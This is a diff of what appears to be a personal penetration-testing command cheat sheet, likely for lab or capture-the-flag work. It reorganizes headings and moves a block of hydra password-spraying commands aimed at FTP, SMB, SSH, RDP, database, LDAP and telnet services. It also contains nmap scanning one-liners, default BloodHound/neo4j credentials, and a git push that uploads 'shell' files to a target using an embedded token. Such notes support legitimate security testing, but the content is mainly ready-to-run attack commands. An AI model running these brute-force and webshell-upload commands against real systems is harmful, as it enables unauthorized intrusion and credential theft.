@@ -23,28 +23,29 @@ sudo ip link delete adapter0
 sudo ip addr del 10.130.108.117/24 dev adapter0
 
 # Discovery
-## Nessus
+## Nessus scan
 systemctl status nessusd
 systemctl start nessusd
 chromium "https://localhost:8834"
 
-## External Scan
+## External scans
 (sudo nmap -Pn -n -sS "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_1000_$TARGET' &)
 (sudo nmap -Pn -n -sU "$TARGET" --open -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_1000_$TARGET' &)
 (sudo nmap -Pn -n -sS "$TARGET" --open -p- -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_ALL_$TARGET' &)
 (sudo nmap -Pn -n -sU "$TARGET" --open -p- -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_ALL_$TARGET' &)
 (udpy_proto_scanner.py $TARGET | tee UDP_PROTO_$TARGET &)
 
-## Internal Scan
+## Internal scans
 nbtscan 10.129.121.0/24
 nbtscan-unixwiz 10.129.121.0/24 -m -n -w 0 | sort -k2
 netdiscover
 ipcalc 172.16.1.73/24     Netmask:   255.255.255.0 = 24
 
 # Information Gathering
-## Set Ports List then Scan
+## Set ports list
 PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); echo $PORTS
 
+## Scan specified ports
 (sudo nmap -Pn -n -sC "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_$TARGET' &)
 (sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_$TARGET' &)
 (sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_$TARGET' &)
@@ -53,20 +54,6 @@ PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf 
 echo '$TARGET' > hosts
 echo '$TARGET' > dc-hosts
 echo '$TARGET' > pc-hosts
-
-## Spray Services
-for host in $(cat hosts); do
-(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
-; done
 
 ## Web
 [*] Technology
@@ -105,17 +92,17 @@ wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 # Exploitation
-## Hosts
+## Add to /etc/hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
-## Scans
+## Open nmap scans
 HOST=$TARGET; mousepad TCP_ALL_*"$HOST".nmap UDP_ALL_*"$HOST".nmap SCRIPTS_*"$HOST".nmap VULN_*"$HOST".nmap VERSIONS_*"$HOST".nmap
 
-## Sorting Files
+## Sorting files
 sort -u usernames | tee usernames
 sort -u passwords | tee passwords
 
-## Decompressing Files
+## Decompressing files
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
@@ -299,13 +286,27 @@ https://datafetcher.com/graphql-json-body-converter
 [*] Git
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
-## Bloodhound
+## Start bloodhound
 sudo neo4j start
 chromium "http://localhost:7474"
 bloodhound
 neo4j:neo4j
 neo4j:bloodhound
 MATCH (u:User) RETURN u
+
+## Spray services
+for host in $(cat hosts); do
+(hydra -I ftp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I smb2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mssql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I mysql://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap2://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ldap3://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I ssh://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rdp://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I telnet://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+(hydra -I rlogin://$host -L usernames -P passwords -e n -t15 2>/dev/null | grep -viE 'Hydra|DATA|completed|module' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &)
+; done
 
 ## Infrastructure
 [*] Shells
